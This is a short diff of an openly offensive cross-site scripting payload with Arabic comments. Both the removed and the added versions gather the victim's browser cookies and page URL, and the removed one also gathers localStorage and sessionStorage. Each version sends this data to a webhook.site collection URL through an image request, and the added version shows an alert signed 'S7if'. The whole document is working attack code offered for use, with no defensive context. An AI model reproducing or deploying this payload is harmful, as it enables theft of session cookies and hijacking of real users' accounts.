@@ -1,26 +1,17 @@
 <script>
-function toBase64Unicode(str) {
-  return btoa(unescape(encodeURIComponent(str)));
-}
+  // أول حاجة: تنبيه بسيط إن الكود اشتغل
+  alert("💀 XSS Triggered by S7if 💀");
 
-let data = `
-🍪 Cookies:
-${document.cookie}
-
-📦 LocalStorage:
-${JSON.stringify(localStorage, null, 2)}
-
-📦 SessionStorage:
-${JSON.stringify(sessionStorage, null, 2)}
-
-🌍 URL:
-${location.href}
-
-⏰ Time:
-${new Date().toISOString()}
+  // تجميع البيانات
+  const payload = `
+🍪 Cookies: ${document.cookie}
+🌍 URL: ${location.href}
 `;
 
-new Image().src = "https://webhook.site/9587c7b9-459a-447f-8fe9-6f16c5fc41ca?data=" + toBase64Unicode(data);
-
-alert("✅ XSS Triggered & Data sent!");
+  // إنشاء صورة عشان ترسل البيانات (GET request)
+  const img = new Image();
+  img.src = "https://webhook.site/9587c7b9-459a-447f-8fe9-6f16c5fc41ca?data=" + encodeURIComponent(payload);
+  
+  // إضافتها للصفحة (مش ضروري، بس أضمن)
+  document.body.appendChild(img);
 </script>
